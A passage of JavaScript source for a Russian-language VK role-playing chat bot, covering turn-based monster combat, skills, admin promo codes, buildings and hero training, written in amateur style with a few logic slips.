		&#4448;&#4448;• ❤ HP: ${user.temp.hp}`+(user.setwear == false ? `\n` : ` + ${user.set[user.setwear].count}`)+`
		\n&#4448;&#4448;• ⚜ Ранг: ${user.rang.toString().replace(/1/gi, "Фарфоровый").replace(/2/gi, "Обсидиановый ").replace(/3/gi, "Стальной ").replace(/4/gi, "Сапфировый ").replace(/5/gi, "Изумрудный ").replace(/5/gi, "Рубиновый  ").replace(/5/gi, "Бронзовый  ").replace(/5/gi, "Серебряный  ").replace(/5/gi, "Золотой  ").replace(/10/gi, "Платиновый  ")}
		`
		text += `
		🆚 Для проведения обычной атаки, введи "!атака"
		`
		return text
		}
			}
		if(user.limits.pvewar == true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n📛 Вы сможете напасть через ${user.pvetime} минут(у/ы).`);
		user.limits.pvewar = true;
		if(rpg.users[user_id(context.user)].level < 1){
            user.pvetime = 1
		}
		if(rpg.users[user_id(context.user)].level >= 1){
            user.pvetime = 1
		}
		if(rpg.users[user_id(context.user)].level >= 2){
            user.limits.pvewar = false
		}
		text += `
		@id${context.user} (${rpg.users[user_id(context.user)].prefix}),
		• 🔀 Подбор врага завершен
		• ⚔ Ваш противник:
		`
		text += `
		&#4448;• 🎭 ${mob.name} | ${level} lvl
		&#4448;&#4448;• ⚔ Урон: ${Math.round(mob.damage + level)}
		&#4448;&#4448;• ❤ HP: ${Math.round(mob.hp + level)}
		&#4448;&#4448;• 🔗 Тип: ${mob.type.toString().replace(/1/gi, "Эльдрази").replace(/2/gi, "Человек").replace(/3/gi, "Эльф").replace(/4/gi, "Зверь").replace(/5/gi, "Элементаль").replace(/6/gi, "Насекомое").replace(/7/gi, "Вурм").replace(/8/gi, "Паук").replace(/9/gi, "Драконы")}
		&#4448;&#4448;• 🌟 Элемент: ${mob.element.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")}
		&#4448;&#4448;• 📖 Данные из бестиария:
		&#4448;• ${mob.description}
		`
        text += `\n• ⚔ Ваша статистика:\n`
        text += `
		&#4448;• 👥 @id${context.user} (${rpg.users[user_id(context.user)].prefix}), ${user.class} | 🔰 ${user.lvl} lvl
		&#4448;&#4448;• ⚔ Урон: ${user.temp.damage}`+(user.weaponwear == false ? `` : ` + ${user.weapon[user.weaponwear].count}`)+`
		&#4448;&#4448;• ❤ HP: ${user.temp.hp}`+ (user.setwear == false ? `\n` : ` + ${user.set[user.setwear].count}`)+`
		\n&#4448;&#4448;• ⚜ Ранг: ${user.rang.toString().replace(/1/gi, "Фарфоровый").replace(/2/gi, "Обсидиановый ").replace(/3/gi, "Стальной ").replace(/4/gi, "Сапфировый ").replace(/5/gi, "Изумрудный ").replace(/5/gi, "Рубиновый  ").replace(/5/gi, "Бронзовый  ").replace(/5/gi, "Серебряный  ").replace(/5/gi, "Золотой  ").replace(/10/gi, "Платиновый  ")}
		`
        text += `\n🆚 Для проведения обычной атаки, введи "!атака"`
		user.enemyid = id;
		user.enemy = {
            id: id,
			name: mob.name,
			damage: Math.round(mob.damage + level),
			hp: Math.round(mob.hp + level),
			rare: mob.rare,
			type: mob.type,
			element: mob.element,
			level: level
			}
		if(context.isChat == false){
		return context.send({
		message: text,
		keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({
            label: '🗡 Ближний бой',
            color: Keyboard.NEGATIVE_COLOR,
            })
	],
	[
            Keyboard.textButton({
            label: '🔯 Способность',
            color: Keyboard.POSITIVE_COLOR,
            })
	]
	])
	.inline(true)
			})
		}
		return context.send(`${text}`)
	});

	vk.updates.hear(/^(?:!атака|🗡 Атака |🗡 Ближний бой)\s?([0-9]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
		let i = context.$match[1];
		if(!user.stage){
			user.stage = 0
		}
		if(user.enemyid == false) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\nНекого атаковать. Введи "!пве"`)
			let text = ``;
			let mhp = user.enemy.hp;
			let mdmg = user.enemy.damage;
			let enemy = user.enemy;
			let def = Math.round(user.defence / 2)
			let mobinf = user.enemy.name;
			let moblevel = enemy.level
            if(!user.enemy.mut){
              user.enemy.mut = 0
            }
            if(user.temp.damage >= user.enemy.hp + user.enemy.damage && user.enemy.mut == 0){
                mhp = Math.round(mhp + user.hp + user.defence / 100 * 95)
                mdmg = Math.round(mdmg + user.damage / 100 * 50)
                user.enemy.mut = 1
                user.mobmut = 1
                text += `\n&#4448;• ☣ ${mobinf} мутировал(а/о)!`
            }
			if(user.temp.hp == 0){
				user.temp.hp = user.hp + def;
			}
			if(user.temp.damage == 0){
			user.temp.damage = user.damage;
			}
			let hp = user.temp.hp
			let dmg = user.temp.damage
			let chance = rand(0,1)
			let crit = [1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,1.9,2].random();
            let mcrit = [1.3,1.4,1.5,1.6,1.7,1.8,1.9,2].random();
            let first = rand(0,1);
            if(mhp <= 0){
                first = 0
            }
            let mchance = rand(1,10)
				if(user.weapon[user.weaponwear] != null){ dmg += user.weapon[user.weaponwear].count;};
				if(user.set[user.setwear] != null){ hp += user.set[user.setwear].count;};
				if(chance == 1){
                    dmg = Math.round(dmg * crit);
                    text +=`\n&#4448;• ⚡ Множитель Критического удара - ${crit}`
                }
				if(mchance > 5){
                    mdmg = Math.round(mdmg * mcrit);
                    text +=`\n&#4448;• ⚡ Множитель Критического удара ${mobinf} - ${mcrit}`
                }
				if(mchance < 5){
                    mhp = Math.round(mhp * mcrit);
                    text +=`\n&#4448;• ⚡ Множитель Брони ${mobinf} - ${mcrit}`
                }
				if(mchance == 5){
                    mhp = Math.round(mhp * mcrit);
                    mdmg = Math.round(mdmg * mcrit);
                    text +=`\n&#4448;• ⚡ Множитель Брони ${mobinf} - ${mcrit}\n&#4448;• ⚡ Множитель Критического удара ${mobinf} - ${mcrit}`
                }
                if(first == 0){
				mhp -= dmg;
				user.stage += 1;
				text += `\n&#4448;• 🔁 Этап ${user.stage}. @id${context.user} (${rpg.users[user_id(context.user)].prefix}) наносит ${dmg} урона по ${enemy.name} | Осталось: ${mhp} HP`
					if(mhp > 0){
						hp -= mdmg
						user.stage += 1;
						text += `\n&#4448;• 🔁 Этап ${user.stage}. ${enemy.name} наносит ${mdmg} урона по @id${context.user} (${rpg.users[user_id(context.user)].prefix}) | Осталось: ${hp} HP`
							if(hp <= 0){
							delete user.enemy;
							user.enemyid = false;
							user.temp.hp = 0;
							user.temp.damage = 0;
							user.stage = 0;
							user.die.pve += 1;
							bonehoard_up()
							if(context.isChat == false){
								return context.send({
								message: `💀 Вы погибли от ${mobinf}\n📒 История битвы: ${text}`,
								keyboard: Keyboard.keyboard([
								[
											Keyboard.textButton({
											label: '👥 Профиль',
											color: Keyboard.NEGATIVE_COLOR,
											})
									],
									[
											Keyboard.textButton({
											label: '⚔ PVE',
											color: Keyboard.POSITIVE_COLOR,
											})
									]
									])
								})
							}
							return context.send(`💀 Вы погибли от ${mobinf}\n📒 История битвы: ${text}`)
							}
							if(hp > 0){
								user.temp.hp = hp
								user.enemy.hp = mhp
								if(context.isChat == false){
								return context.send({
								message: `❎ ${mobinf} - не побежден после ${user.stage} этапа.\n📒 История битвы: ${text}\n⏩ Продолжайте атаковать!`,
								keyboard: Keyboard.keyboard([
							 [
									Keyboard.textButton({
									label: '🗡 Ближний бой',
									color: Keyboard.NEGATIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '🔯 Способность',
									color: Keyboard.POSITIVE_COLOR,
									})
							]
							])
							.inline(true)
									})
								}
								return context.send(`❎ ${mobinf} - не побежден после ${user.stage} этапа.\n📒 История битвы: ${text}\n⏩ Продолжайте атаковать!`)
							}
					}
					if(mhp <= 0){
						delete user.enemy;
						user.enemyid = false;
						user.temp.hp = 0;
						user.temp.damage = 0;
						user.stage = 0;
						if(moblevel >= Math.round(user.lvl / 1.3)){

						if(rand(1, 10) == 3){
                        item_drop(user)
						}
						user.kills.pve.total += 1
						world.mobs.killed++
						bonehoard_up()
                        uplvl(user)
                            if(user.mobmut == 1){
                            user.exp += 1
                            }
						if(context.isChat == false){
						return context.send({
						message: `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`,
						keyboard: Keyboard.keyboard([
					 [
							Keyboard.textButton({
							label: '👥 Профиль',
							color: Keyboard.POSITIVE_COLOR,
							})
					],
					[
							Keyboard.textButton({
							label: '⚔ PVE',
							color: Keyboard.NEGATIVE_COLOR,
							})
					]
					])
							})
						}
						return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`)
						}
						user.kills.pve.total += 1
						world.mobs.killed++
						bonehoard_up()
                        uplvl(user)
                        if(user.mobmut == 1){
                            user.exp += 1
                            }
						if(context.isChat == false){
						return context.send({
						message: `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`,
						keyboard: Keyboard.keyboard([
					 [
							Keyboard.textButton({
							label: '👥 Профиль',
							color: Keyboard.POSITIVE_COLOR,
							})
					],
					[
							Keyboard.textButton({
							label: '⚔ PVE',
							color: Keyboard.NEGATIVE_COLOR,
							})
					]
					])
							})
						}
						return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`)

					}
			}
                if(first == 1){
				let dodje = rand(1,10)
				if(dodje <= 3){
				user.stage += 1;
				if(context.isChat == false){
				return context.send({
				message: `\n&#4448;• 🔁 Этап ${user.stage}. ${enemy.name} бьет первый(ая), но @id${context.user} (${rpg.users[user_id(context.user)].prefix}) уворачивается от удара на ${mdmg} урона`,
				keyboard: Keyboard.keyboard([
			 [
					Keyboard.textButton({
					label: '🗡 Ближний бой',
					color: Keyboard.NEGATIVE_COLOR,
					})
			],
			[
					Keyboard.textButton({
					label: '🔯 Способность',
					color: Keyboard.POSITIVE_COLOR,
					})
			]
			])
			.inline(true)
					})
				}
				return context.send(`\n&#4448;• 🔁 Этап ${user.stage}. ${enemy.name} бьет первый(ая), но @id${context.user} (${rpg.users[user_id(context.user)].prefix}) уворачивается от удара на ${mdmg} урона`)
				}
				hp -= mdmg;
				user.stage += 1;
				text += `\n&#4448;• 🔁 Этап ${user.stage}. ${enemy.name} наносит ${mdmg} урона по @id${context.user} (${rpg.users[user_id(context.user)].prefix}) | Осталось: ${hp} HP`
                    if(hp <= 0){
							delete user.enemy;
							user.enemyid = false;
							user.temp.hp = 0;
							user.temp.damage = 0;
							user.stage = 0;
							user.die.pve += 1;
							bonehoard_up()
							if(context.isChat == false){
							return context.send({
								message: `💀 Вы погибли от ${mobinf}\n📒 История битвы: ${text}`,
								keyboard: Keyboard.keyboard([
								[
											Keyboard.textButton({
											label: '👥 Профиль',
											color: Keyboard.NEGATIVE_COLOR,
											})
									],
									[
											Keyboard.textButton({
											label: '⚔ PVE',
											color: Keyboard.POSITIVE_COLOR,
											})
									]
									])
								})
							}
							return context.send(`💀 Вы погибли от ${mobinf}\n📒 История битвы: ${text}`)
							}
                    if(hp > 0){
                        mhp -= dmg
                        user.stage += 1;
                        text += `\n&#4448;• 🔁 Этап ${user.stage}. @id${context.user} (${rpg.users[user_id(context.user)].prefix}) наносит ${dmg} урона по ${enemy.name} | Осталось: ${mhp} HP`
                        if(mhp <= 0){
						  delete user.enemy;
						  user.enemyid = false;
						  user.temp.hp = 0;
						  user.temp.damage = 0;
						  user.stage = 0;
                            if(moblevel >= Math.round(user.lvl / 1.3)){
                              if(rand(1, 10) == 3){
                        item_drop(user)
						}
                                user.kills.pve.total += 1
								world.mobs.killed++
								bonehoard_up()
                                uplvl(user)
                                if(user.mobmut == 1){
                            user.exp += 1
                            }
							if(context.isChat == false){
						return context.send({
						message: `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`,
						keyboard: Keyboard.keyboard([
					 [
							Keyboard.textButton({
							label: '👥 Профиль',
							color: Keyboard.POSITIVE_COLOR,
							})
					],
					[
							Keyboard.textButton({
							label: '⚔ PVE',
							color: Keyboard.NEGATIVE_COLOR,
							})
					]
					])
							})
							}
							return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`)
						  }
							user.kills.pve.total += 1
							world.mobs.killed++
							bonehoard_up()
                            uplvl(user)
                            if(user.mobmut == 1){
                            user.exp += 1
                            }
						if(context.isChat == false){
						return context.send({
						message: `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`,
						keyboard: Keyboard.keyboard([
					 [
							Keyboard.textButton({
							label: '👥 Профиль',
							color: Keyboard.POSITIVE_COLOR,
							})
					],
					[
							Keyboard.textButton({
							label: '⚔ PVE',
							color: Keyboard.NEGATIVE_COLOR,
							})
					]
					])
							})
						}
						return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n⭐ Вы победили ${mobinf}\n📒 История последнего этапа: ${text}`)
					}
                        if(mhp > 0){
								user.temp.hp = hp
								user.enemy.hp = mhp
								if(context.isChat == false){
								return context.send({
								message: `❎ ${mobinf} - не побежден после ${user.stage} этапа.\n📒 История битвы: ${text}\n⏩ Продолжайте атаковать!`,
								keyboard: Keyboard.keyboard([
							 [
									Keyboard.textButton({
									label: '🗡 Ближний бой',
									color: Keyboard.NEGATIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '🔯 Способность',
									color: Keyboard.POSITIVE_COLOR,
									})
							]
							])
							.inline(true)
									})
								}
								return context.send(`❎ ${mobinf} - не побежден после ${user.stage} этапа.\n📒 История битвы: ${text}\n⏩ Продолжайте атаковать!`)
							}
                    }

                }
	});

vk.updates.hear(/^(?:!способность|🔯 Способность| 🔯 Способность)\s?([0-9]+)?/i, (context) => {
	if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы попытались использовать магию, но... Ничего...`);
	let user = rpg.users[user_id(context.user)];
	if(context.isChat == false){
		if(!user.skill.name) return context.send({
								message: `📛 Вы не обучены способностям! Введи "!навык"`,
								keyboard: Keyboard.keyboard([
							 [
									Keyboard.textButton({
									label: '💥 Навык',
									color: Keyboard.NEGATIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '🗡 Ближний бой',
									color: Keyboard.POSITIVE_COLOR,
									})
							]
							])
							.inline(true)
									})
	}
	if(!user.skill.name) return context.send(`📛 Вы не обучены способностям! Введи "!навык"`)

		if(user.limits.skill == true) return context.send(`📛 Идет восстановление навыка!\n📛 Осталось: ${user.skill.time} минут(а/ы)`);
		if(!user.stage){
			user.stage = 0
		}
		if(user.enemyid == false) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\nНекого атаковать. Введи "!пве"`)
			let text = ``;
			let mhp = user.enemy.hp;
			let mdmg = user.enemy.damage;
			let enemy = user.enemy;
			let def = Math.round(user.defence / 2)
			let mobinf = user.enemy.name;
			let moblevel = enemy.level
            if(!user.enemy.mut){
              user.enemy.mut = 0
            }
            if(user.temp.damage >= user.enemy.hp + user.enemy.damage && user.enemy.mut == 0){
                mhp = Math.round(mhp + user.hp + user.defence / 100 * 95)
                mdmg = Math.round(mdmg + user.damage / 100 * 50)
                user.enemy.mut = 1
                user.mobmut = 1
                text += `\n&#4448;• ☣ ${mobinf} мутировал(а/о)!`
            }
			if(user.temp.hp == 0){
				user.temp.hp = user.hp + def;
			}
			if(user.temp.damage == 0){
			user.temp.damage = user.damage;
			}
			let hp = user.temp.hp
			let dmg = user.temp.damage
                user.limits.skill = true
				if(user.skill.id == 1){
                    user.skill.time = 15
					let olddmg = user.temp.damage
					user.temp.damage += Math.round(user.damage * user.skill.count * user.skill.level/10)
					let dmgrazn = user.temp.damage - olddmg
					return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n💥 Прирост урона: +${dmgrazn}\n🔋 Перезарядка: ${user.skill.time} минут`)
				}
				if(user.skill.id == 2){
                    user.skill.time = 15
					let oldhp = user.temp.hp
					user.temp.hp += Math.round(user.hp * user.skill.count * user.skill.level/10)
					let hprazn = user.temp.hp - oldhp
					return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n🛡 Прирост брони: +${hprazn}\n🔋 Перезарядка: ${user.skill.time} минут`)
				}
				if(user.skill.id == 3){
                    user.skill.time = 15
                    if(user.class == "Жрец"){
                    user.temp.hp += Math.round(user.skill.count) * user.skill.level * 2
					return context.send(`🎆 Вы использовали навык ${user.skill.name} Жреца!\n☯ Вы исцелили: +${Math.round(user.skill.count) * user.skill.level * 2}💙\n🔋 Перезарядка: ${user.skill.time} минут`)
                    }
					user.temp.hp += Math.round(user.skill.count) * user.skill.level
					return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n☯ Вы исцелили: +${user.skill.count * user.skill.level}💙\n🔋 Перезарядка: ${user.skill.time} минут`)
				}
				if(user.skill.id == 4){
                    user.skill.time = 5
					let oldhp = user.temp.hp
					user.temp.hp = Math.round(user.defence * user.skill.count)
					return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n🛡 Прочность барьера: ${Math.round(user.defence * user.skill.count)}\n🔋 Перезарядка: ${user.skill.time} минут`)
				}
				if(user.skill.id == 5){
                    user.skill.time = 1
					user.enemy.hp -= user.skill.count * user.skill.level
                        if(user.enemy.hp <= 0) return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n🎃 ${user.enemy.name}: -${Math.round(user.skill.count) * user.skill.level}💙\n🏁 Добейте врага!\n🔋 Перезарядка: ${user.skill.time} минут`)

                    return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n🎃 ${user.enemy.name}: -${Math.round(user.skill.count) * user.skill.level} HP\n🔋 Перезарядка: ${user.skill.time} минут`)
				}
				if(user.skill.id == 6){
                    user.skill.time = 3
					user.enemy.hp -= user.skill.count * user.skill.level
                    if(user.enemy.hp <= 0) return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n🎃 ${user.enemy.name}: -${Math.round(user.skill.count) * user.skill.level}💙\n🏁 Добейте врага простой атакой!\n🔋 Перезарядка: ${user.skill.time} минут`)

					return context.send(`🎆 Вы использовали навык ${user.skill.name}!\n🎃 ${user.enemy.name}: -${Math.round(user.skill.count)} HP\n🔋 Перезарядка: ${user.skill.time} минут`)
				}
	});

	vk.updates.hear(/^(?:!спромо)\s?([0-9]+)?\s?([0-9]+)?\s?([0-9]+)?\s?([0-9]+)?/i, (context) => {
		let user = rpg.users[user_id(context.user)];
		if(user.admin < 3) return;

		let a = Number(context.$match[1])
		let b = Number(context.$match[2])
		let c = Number(context.$match[3])
		let cods = 0;

		if(a && b && c){
			if(a==1){
				cods = cod();
				rpcode[cods] = { id: 1, name: 'gold', activ: Number(b), count: Number(c), users: {} }
				return context.send(`🔸 Промокод на ${spaces(c)} золота создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`);
			}
			if(a==2){
				cods = cod();
				rpcode[cods] = { id: 2, name: 'wood', activ: Number(b), count: Number(c), users: {} }
				return context.send(`🔸 Промокод на ${spaces(c)} дерева создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`);
			}
			if(a==3){
				cods = cod();
				rpcode[cods] = { id: 3, name: 'stone', activ: Number(b), count: Number(c), users: {} }
				return context.send(`🔸 Промокод на ${spaces(c)} камня создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`);
			}
			if(a==4){
				cods = cod();
				rpcode[cods] = { id: 4, name: 'rolls', activ: Number(b), count: Number(c), users: {} }
				return context.send(`🔸 Промокод на ${spaces(c)} вращений создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`);
			}
		}

		return context.send(`
			🔸 Создание промокода:
			🔸 1. Золото
			🔸 2. Дерево
			🔸 3. Камень
			🔸 4. Вращения
			🔸 - - - - - -
			🔸 !спромо № активаций кол-во
		`);
	});

	function cod(){
		var result  = '';
		let words  = 'abcdefghijklmnopqrstuvwxyz1234567890';
		let max_position = words.length - 1;
		for( i = 0; i < 8; ++i ) {
			position = Math.floor ( Math.random() * max_position );
			result = result + words.substring(position, position + 1);
		}
		return result
	}

	vk.updates.hear(/^(?:!промокод)\s?([^]+)?/i, (context) => {
        if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
		if(!context.$match[1]) return context.send(`📛 Пример команды: "!промокод <код>"`);
		let i = context.$match[1].toLowerCase();
		if(!rpcode[i]) return context.send(`🔸 Такого промокода нет.\n🔸 Либо его уже активировали.`);
		if(rpcode[i].users[context.user]) return context.send(`🔸 Вы уже активировали этот промокод.`);
		rpcode[i].users[context.user] = {i: true}
		rpcode[i].activ -= 1;
		if(rpcode[i].id == 1 || rpcode[i].id == 4){
			user[String(rpcode[i].name)] += rpcode[i].count;
			context.send(`🔮 ➾ Вы успешно активировали промокод\n🔱 ➾ Получено: ${spaces(rpcode[i].count)} ${rpcode[i].name.toString().replace(/gold/gi, "золота").replace(/card/gi, "вращений")}\n📛 ➾ Осталось активаций: ${rpcode[i].activ}`)
		}
		if(rpcode[i].id == 2 || rpcode[i].id == 3){
			user.res[String(rpcode[i].name)] += rpcode[i].count;
			context.send(`🔮 ➾ Вы успешно активировали промокод\n🔱 ➾ Получено: ${spaces(rpcode[i].count)} ${rpcode[i].name.toString().replace(/wood/gi, "дерева").replace(/stone/gi, "камня")}\n📛 ➾ Осталось активаций: ${rpcode[i].activ}`)
		}
		if(rpcode[i].activ <= 0){delete rpcode[i]}
		return;
	});

	vk.updates.hear(/^(?:!постройки|!постройка)/i, (context) => {
        if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
		return context.send(`
			🚧 Добывающие
			1&#8419; Лесопилка [1000 д.] +10д. / час - `+(user.objects.lesopilka == 0 ? ` [❎]` : ` [✅] ${user.objects.lesopilka} / 10`)+`
			2&#8419; Золотая шахта [1500 д.] +5з. / час - `+(user.objects.gold == 0 ? ` [❎]` : ` [✅] ${user.objects.gold} / 10`)+`
			3&#8419; Каменоломня [5000 д.] +10к. / час - `+(user.objects.kamenolom == 0 ? ` [❎]` : ` [✅] ${user.objects.kamenolom} / 10`)+`
			- - - - - -
			❤ Повышающие [Здоровье]
			4&#8419; Магический алтарь [5000 к.] +2 / час - `+(user.objects.hp == false ? ` [❎]` : ` ✅`)+`
			- - - - - -
			🛡 Повышающие [Защиту]
			5&#8419; Рыцарский храм [5000 к.] +2 / час - `+(user.objects.def == false ? ` [❎]` : ` ✅`)+`
			- - - - - -
			⚔ Повышающие [Урон]
			6&#8419; Военная академия [5000 к.] +2 / час - `+(user.objects.dmg == false ? ` [❎]` : ` [✅]`)+`
			- - - - - -
			🗡 Повышающие [Навык]
			7&#8419; Магический круг [5000 к.] +1 / 5 чаcов - `+(user.objects.skill == false ? ` [❎]` : ` [✅]`)+`
			- - - - - -
			&#10067; Название [цена] +прибыль/навык
			&#10067; д.- дерево | к. - камень.
			⏩ Для постройки напишите: '!строить ID'
		`);
	});

	vk.updates.hear(/^(?:!строить)\s?([0-9]+)?/i, (context) => {
        if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let i = context.$match[1];
		let user = rpg.users[user_id(context.user)];
		if(!i || !Number(i)) return context.send(`📛 Пример команды: "строить ID"\n📛 ID - номер постройки ('!постройки')`);
		if(i < 0 || i > 7) return context.send(`📛 Неверно указан номер постройки. ('постройки')`);

		if(i==1 && user.res.wood < 1000|| i == 2 && user.res.wood < 1500 || i == 3 && user.res.wood < 5000) return context.send(`📛 У вас недостаточно древесины.`);
		if(i==4 && user.res.stone < 5000|| i == 5 && user.res.stone < 5000 || i == 6 && user.res.stone < 5000 || i == 7 && user.res.stone < 5000) return context.send(`📛 У вас недостаточно камня.`);

		if(i == 4 && user.objects.hp == true) return context.send(`📛 Уже построено `);
		if(i == 5 && user.objects.def == true) return context.send(`📛 Уже построено`);
		if(i == 6 && user.objects.dmg == true) return context.send(`📛 Уже построено`);
		if(i == 7 && user.objects.skill == true) return context.send(`📛 Уже построено`);

		if(user.limits.build != false) return context.send(`📛 Вы уже начали постройку объекта. Дождитесь её завершения.`);

		if(i==1){user.res.wood -= 1000} if(i==2){user.res.wood -= 1500} if(i==3){user.res.wood -= 5000}
		if(i==4){user.res.stone -= 5000} if(i==5){user.res.stone -= 5000} if(i==6){user.res.stone -= 5000} if(i==7){user.res.stone -= 5000}

		user.limits.build = 3;
 		if(user.vip == 1){
 			user.limits.build = 2;
 		}

        user.limits.id = Number(i)
		let name = [0, 'Лесопилки','Золотой Шахты','Каменоломни','Магического алтаря','Рыцарского храма','Военной академии','Магического круга']

		return context.send(`
		🚧 Вы успешно начали постройку (${name[i]}).
		⌛ Время постройки объекта: 3 часа.
		⌛ (Для VIP - 2 часа)
		`);
	});

	vk.updates.hear(/^(?:!обучить)\s?([0-9]+)?/i, (context) => {
        if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
        let user = rpg.users[user_id(context.user)];
		let i = Number(context.$match[1])
		if(i < 0 || i > 5) return context.send(`📛 Неверно указан номер.`);
		if(i){
			if(i == 1 && user.objects.hp == false) return context.send(`📛 У вас не построен Магический алтарь ('!постройки')`);
			if(i == 2 && user.objects.def == false) return context.send(`📛 У вас не построен Рыцарский храм ('!постройки')`);
			if(i == 3 && user.objects.dmg == false) return context.send(`📛 У вас не построена Военная академия ('!постройки')`);
			if(i == 4 && user.objects.skill == false) return context.send(`📛 У вас не построен Магический круг ('!постройки')`);
			if(user.limits.up == true) return context.send(`📛 Вы уже отправили героя на учения. Дождитесь его возвращения! До конца обучения: ${user.studytime} час(а/ов)`);

			user.limits.up = true;
			if(i==1){
				user.studytime = 24;
				user.studytype = 1;
			}
			if(i==2){
				user.studytime = 24;
				user.studytype = 2;
			}
			if(i==3){
				user.studytime = 24;
				user.studytype = 3;
			}
			if(i==4){
                if(!user.skill.name) return context.send(`🔹 У Вас нет активного навыка, который можно улучшить! Введи "!навыки"`);
				user.studytime = 24;
				user.studytype = 4;
				user.skill.level += 1;
                return context.send(`🔹 Вы успешно отправили героя на учения.\n🔹 Через 24 часа он вернется с новым уровнем навыка.`);
			}

			return context.send(`🔹 Вы успешно отправили героя на учения.\n🔹 Через 24 часа он вернется с новыми навыками.`);

		}else{
			return context.send(`
			🔹 В данном разделе Вы можете отправить своего героя на обучение.
			- - - - -
			❤ Повышение здоровья
			`+(user.objects.hp == false ? `❌ Магический алтарь: не построен`: `1&#8419; Магический алтарь: построен`)+`
			- - - - -
			🛡 Повышение защиты
			`+(user.objects.def == false ? `❌ Рыцарский храм: не построен`: `2&#8419; Рыцарский храм: построен`)+`
			- - - - -
			⚔ Повышение атаки
			`+(user.objects.dmg == false ? `❌ Военная академия: не построена`: `3&#8419; Военная академия: построена`)+`
			- - - - -
			🗡 Повышение уровня навыка
			`+(user.objects.skill == false ? `❌ Магический круг: не построен`: `4&#8419; Магический круг: построен`)+`
			- - - - -
			`+((user.objects.hp == false && user.objects.def == false && user.objects.dmg == false && user.objects.skill == false) ? `❗ Чтобы улучшить характеристики героя\n ❗ Постройте здания, где герой может тренироваться`: `❗ Чтобы отправить тренироваться героя, напишите:\n❗ '!обучить ID'\n❗ ID - это номер постройки.`)+`
			`);
		}
	});

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.up == true){
                 user.studytime -= 1
                    if(user.studytime == 0 || user.studytime < 0){
                    user.limits.up = false;
						if(user.studytype = 1){
							user.hp += 1;
						}
						if(user.studytype = 2){
							user.defence += 1;
						}
						if(user.studytype = 3){
							user.damage += 1;
						}
						if(user.studytype = 4){
							user.skill.level += 1;
						}
                 }
 			 }
 		}
 	}, 3600000);

 	vk.updates.hear(/^(?:!инвентарь|!инв)/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
		let text = ``;
		if(user.items == 0) return context.send(`🚫 ➾ Инвентарь пуст.`);
		var tops = []
		for (i=1;i<5000;i++) {
		if(user.inventory[i]){
					tops.push({
					name: user.inventory[i].name,
					id: user.inventory[i].id,
					type: user.inventory[i].itemtype,
					level: user.inventory[i].level,
					count: user.inventory[i].count,
					rarity: user.inventory[i].rarity,
					class: user.inventory[i].class,
					price: user.inventory[i].price
					})

				}
		}
		tops.sort(function(a, b) {
			if (b.level > a.level) return 1
			if (b.level < a.level) return -1
			return 0
		})
		var yo = []

		for (var g = 0; g < 10; g++) {
			if (tops.length > g) {
				let ups = g;
				ups += 1;
